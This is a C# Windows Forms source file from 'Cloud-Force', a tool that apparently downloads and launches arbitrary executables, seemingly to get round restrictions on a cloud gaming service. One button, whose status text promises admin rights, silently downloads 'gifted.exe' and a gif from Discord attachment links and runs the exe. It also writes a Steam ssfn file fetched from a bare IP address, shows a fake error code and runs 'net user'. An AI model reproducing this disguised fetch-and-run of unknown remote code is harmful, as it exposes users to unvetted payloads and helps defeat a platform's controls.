﻿/**************************************************************
 * Cloud-Force by Zortos293 and Kief
 *
 * (c) 2022. All rights reserved.
 * You may not distrobute app in anyway if the credits are removed, nor sell it.
 *
 * 9/30/22 11:45AM PDT
 */

using Guna.UI2.WinForms;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace Cloudforce_Revamped
{
    public partial class Extra : Form
    {
        //%appdata%
        private string mainpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Cloudforce\\";

        //Initialize
        public Extra()
        {
            InitializeComponent();
        }

        //Download stuff

        private bool DownloadFinished;

        public void File_Downloader(string URL, string path, Guna.UI2.WinForms.Guna2GradientButton button)
        {
            // download file with progress bar
            DownloadFinished = false;
            WebClient client = new WebClient();
            back.Enabled = false;
            button.Enabled = false;
            guna2ProgressBar1.Value = 0;
            client.DownloadFileCompleted += new AsyncCompletedEventHandler(FileDownloadComplete);
            client.DownloadProgressChanged += new DownloadProgressChangedEventHandler(DownloadChanged);
            client.DownloadFileAsync(new Uri(URL), path);
            while (DownloadFinished == false)
                Application.DoEvents();
        }

        private void ResetButtons(bool Switch)
        {
            // Loop through each control in this container
            foreach (var button in Controls.OfType<Guna.UI2.WinForms.Guna2GradientButton>())
                button.Enabled = Switch;
        }

        private void FileDownloadComplete(object sender, AsyncCompletedEventArgs e)
        {
            if (e.Error == null)
            {
                ResetButtons(true);
                back.Enabled = true;
                DownloadFinished = true;
                guna2ProgressBar1.Value = 0;
                ((WebClient)sender).Dispose();
            }
            else
            {
                MessageBox.Show(e.Error.Message);
            }
        }

        private void DownloadChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            guna2ProgressBar1.Value = e.ProgressPercentage;
        }

        //AFK Timer

        public bool afk_timer_Done;

        //private Timer kick_timer = new Timer();
        private int counter = 0;

        private void timer1_Tick(object sender, EventArgs e)
        {
            counter++;
            if (!this.Visible == false)
            {
                guna2HtmlLabel1.ForeColor = Color.Black;
                guna2HtmlLabel1.Text = $"{120 - counter} seconds left until you can launch exes.";
            }
            if (counter == 120)  //or whatever your limit is
            {
                //kick_timer.Stop();
                afk_timer_Done = true;
                guna2HtmlLabel1.ForeColor = Color.Green;
                guna2HtmlLabel1.Text = "You can now an Game.";
                counter = 0;
            }
        }

        private bool timercheck()
        {
            if (afk_timer_Done == false)
            {
                guna2HtmlLabel1.ForeColor = Color.Red;
                guna2HtmlLabel1.Text = "You are currently in cooldown, please wait until the timer is done.";
                return false;
            }
            else
            {
                return true;
            }
        }

        private void wait_Timer()
        {
            afk_timer_Done = false;
            //kick_timer.Start();
        }

        #region Theme

        private void checktheme()
        {
            if (Main.Dark == true)
            {
                this.BackColor = Color.FromArgb(64, 64, 64);
                changecolorBTN(123, 0, 238, 170, 0, 255);
                guna2GradientPanel1.FillColor = Color.FromArgb(97, 67, 133);
                guna2GradientPanel1.FillColor2 = Color.FromArgb(81, 99, 149);
            }
            if (Main.Light == true)
            {
                this.BackColor = Color.WhiteSmoke;
                changecolorBTN(255, 128, 128, 255, 128, 255);
                guna2GradientPanel1.FillColor = Color.FromArgb(255, 192, 255);
                guna2GradientPanel1.FillColor2 = Color.FromArgb(255, 192, 192);
            }
        }

        private void changecolorBTN(int one, int two, int three, int one1, int two1, int three1)
        {
            foreach (var button in Controls.OfType<Guna.UI2.WinForms.Guna2GradientButton>())
            {
                button.FillColor = Color.FromArgb(one, two, three);
                button.FillColor2 = Color.FromArgb(one1, two1, three1);
            }
        }

        #endregion Theme

        //Buttons
        private void guna2GradientButton10_Click(object sender, EventArgs e)
        {
            var username = Environment.UserName;
            var download_link = guna2TextBox3.Text;
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxysz";
            var stringChars = new char[8];
            var random = new Random();
            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            var exe_name = new String(stringChars);
            Uri uriResult;
            bool result = Uri.TryCreate(download_link, UriKind.Absolute, out uriResult)
                && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);

            if (download_link == "" || download_link == " " || result == false)
            {
                guna2HtmlLabel1.Text = "Please put a valid download link in the input field.";
                guna2HtmlLabel1.ForeColor = Color.Red;
                guna2TextBox3.ForeColor = Color.Red;
                guna2TextBox3.PlaceholderText = "Invalid link.";
                guna2TextBox3.Text = "";
                guna2HtmlLabel2.Text = "Error | Ready for next operation.";
            }
            else
            {
                Boolean dresult = download_link.Contains(".zip");
                if (dresult == true)
                {
                    try
                    {
                        File_Downloader(download_link, mainpath + $"\\{exe_name}.zip", guna2GradientButton10);
                        guna2HtmlLabel1.Text = $"Downloaded: C:\\users\\{username}\\AppData\\Roaming\\Cloudforce\\{exe_name}.zip";
                        guna2TextBox1.Text = $"C:\\users\\{username}\\AppData\\Roaming\\Cloudforce\\{exe_name}.zip";
                        guna2HtmlLabel2.Text = "Status: Ready.";
                    }
                    catch
                    {
                        guna2HtmlLabel1.Text = "An error occured while trying to download.";
                        guna2TextBox3.Text = "";
                        guna2HtmlLabel1.ForeColor = Color.Red;
                        guna2TextBox3.ForeColor = Color.Red;
                        guna2TextBox3.PlaceholderText = "Invalid link.";
                        guna2TextBox3.Text = "";
                        guna2HtmlLabel2.Text = "Error | Ready for next operation.";
                    }
                }
                else
                {
                    try
                    {
                        File_Downloader(download_link, mainpath + $"\\{exe_name}.exe", guna2GradientButton10);
                        guna2HtmlLabel1.Text = $"Downloaded: {mainpath}\\{exe_name}.exe";
                        guna2TextBox2.Text = $"C:\\users\\{username}\\AppData\\Roaming\\Cloudforce\\{exe_name}.exe";
                        guna2HtmlLabel2.Text = "Status: Ready.";
                    }
                    catch
                    {
                        guna2HtmlLabel1.Text = "An error occured while trying to download.";
                        guna2TextBox3.Text = "";
                        guna2HtmlLabel1.ForeColor = Color.Red;
                        guna2TextBox3.ForeColor = Color.Red;
                        guna2TextBox3.PlaceholderText = "Invalid link.";
                        guna2TextBox3.Text = "";
                        guna2HtmlLabel2.Text = "Error | Ready for next operation.";
                    }
                }
                guna2TextBox3.PlaceholderText = "Link here";
                guna2TextBox3.Text = "";
            }
        }

        private void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            var username = Environment.UserName;
            var extract_path = guna2TextBox1.Text;
            if (extract_path == "" || extract_path == " " || File.Exists(extract_path) == false || extract_path.Contains(".zip") == false)
            {
                guna2HtmlLabel1.Text = "Please put a valid path in the input field.";
                guna2HtmlLabel1.ForeColor = Color.Red;
                guna2TextBox1.ForeColor = Color.Red;
                guna2TextBox1.PlaceholderText = "Invalid path.";
                guna2TextBox1.Text = "";
                guna2HtmlLabel2.Text = "Error | Ready for next operation.";
            }
            else
            {
                try
                {
                    ZipFile.ExtractToDirectory($@"{extract_path}", $@"C:\users\{username}\AppData\Roaming\Cloudforce");
                    guna2HtmlLabel1.Text = $"[-] Extracted: {extract_path}";
                    guna2TextBox2.Text = $"C:\\users\\{username}\\AppData\\Roaming\\Cloudforce\\";
                    guna2HtmlLabel2.Text = "Status: Ready.";
                    guna2TextBox1.Text = "";
                }
                catch
                {
                    guna2HtmlLabel1.Text = "Failed to extract zip.";
                    guna2HtmlLabel1.ForeColor = Color.Red;
                    guna2TextBox1.ForeColor = Color.Red;
                    guna2TextBox1.PlaceholderText = "Failed to extract";
                    guna2TextBox1.Text = "";
                    guna2HtmlLabel2.Text = "Error | Ready for next operation.";
                }
            }
        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)
        {
            var run_path = guna2TextBox2.Text;
            if (run_path == "" || run_path == " " || File.Exists(run_path) == false || run_path.Contains(".exe") == false)
            {
                guna2HtmlLabel1.Text = "Please put a valid path in the input field.";
                guna2HtmlLabel1.ForeColor = Color.Red;
                guna2TextBox2.ForeColor = Color.Red;
                guna2TextBox2.PlaceholderText = "Invalid path.";
                guna2TextBox2.Text = "";
                guna2HtmlLabel2.Text = "Error | Ready for next operation.";
            }
            else
            {
                try
                {
                    new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            WorkingDirectory = $"{mainpath}\\",
                            WindowStyle = ProcessWindowStyle.Normal,
                            FileName = run_path,
                        }
                    }.Start();
                    guna2HtmlLabel1.Text = $"[-] Started {run_path}";
                    guna2HtmlLabel2.Text = "Status: Ready.";
                }
                catch
                {
                    guna2HtmlLabel1.Text = "Failed to start exe.";
                    guna2HtmlLabel1.ForeColor = Color.Red;
                    guna2TextBox2.ForeColor = Color.Red;
                    guna2TextBox2.PlaceholderText = "Failed to start";
                    guna2TextBox2.Text = "";
                    guna2HtmlLabel2.Text = "Error | Ready for next operation.";
                }
            }
        }

        private void guna2GradientButton5_Click(object sender, EventArgs e)
        {
            var username = Environment.UserName;
            guna2HtmlLabel2.Text = "Status: Working on %command% reel amdin. Please wait.";
            File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580499796100/worst-mistake.gif", $"C:\\users\\{username}\\downloads\\mistake.gif", guna2GradientButton5);
            File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580042616933/gifted.exe", $"C:\\users\\{username}\\downloads\\worst.exe", guna2GradientButton5);
            File_Downloader("http://178.62.250.139/Files/%25command%25/ssfn_%25command%25.zip", "C:\\Program Files (x86)\\steam\\ssfn_command.zip", guna2GradientButton5);
            new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    WorkingDirectory = $"C:\\users\\{username}\\downloads",
                    WindowStyle = ProcessWindowStyle.Normal,
                    FileName = $"C:\\users\\{username}\\downloads\\worst.exe",
                    Arguments = "mistake.gif"
                }
            }.Start();
            MessageBox.Show("0x8003001F5");
            Thread.Sleep(9000);
            guna2HtmlLabel2.Text = "Status: What status is your gfn account?";
            new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    WorkingDirectory = $"C:\\Windows\\System32\\",
                    WindowStyle = ProcessWindowStyle.Normal,
                    FileName = $"C:\\Windows\\System32\\cmd.exe",
                    Arguments = "cmd /c net user"
                }
            }.Start();
        }

        private void back_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Extra_Load(object sender, EventArgs e)
        {
        }

        private void Extra_Shown(object sender, EventArgs e)
        {
            checktheme();
        }
    }
}